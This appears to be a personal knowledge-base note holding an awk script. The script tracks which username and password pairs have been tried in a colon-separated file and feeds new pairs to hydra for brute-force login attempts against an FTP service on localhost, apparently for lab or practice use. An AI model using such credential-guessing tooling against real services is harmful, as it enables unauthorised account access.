# awk scripting tracking credential reuse bruteforcing with csv file db

- read and write a separated value file as a database
- attempt to reuse credentials using hydra and keep track of usernames and passwords tried

```awk
#!/usr/bin/awk -f
# attempt to reuse credentials using hydra and keep track of usernames and passwords tried
# read and write a separated value file as a database
## pass in parameter "type"

BEGIN {
  tried_database = "cred.dat"
  to_try = "to.try"
  FS=":"
  while (getline < tried_database) {
    print $1, $2
    users[$1] = 1
    passwords[$2] = 1
    tried[$1 FS $2] = 1
  }
  close(tried_database)
}
type ~ /u/ { users[$0] = 1 }
type ~ /p/ { passwords[$0] = 1 }
END {
  for (u in users) {
    for (p in passwords) {
      cred = u FS p
      done = cred in tried
      if (!done) {
        print "Trying " cred
        print cred > to_try
        print cred >> tried_database
      }
    }
  }
  close(to_try)
  command = "hydra -C to.try ftp://localhost"
  print command
  while (command | getline) {
    if ($0 ~ /login:.*password:/){
      print # found a password
    }
  }
}
```

~/kb/awk-scripting/hydra-bruteforce-with-database.awk
` zet/20221003151437/README.md `

# Related

- [20221014185509](/zet/20221014185509/README.md) kb file named kb/auto-awk.md
- [20221003151441](/zet/20221003151441/README.md) awk scripting
- ~/kb/auto-awk.md

Tags:

    #awk #script #database #creds
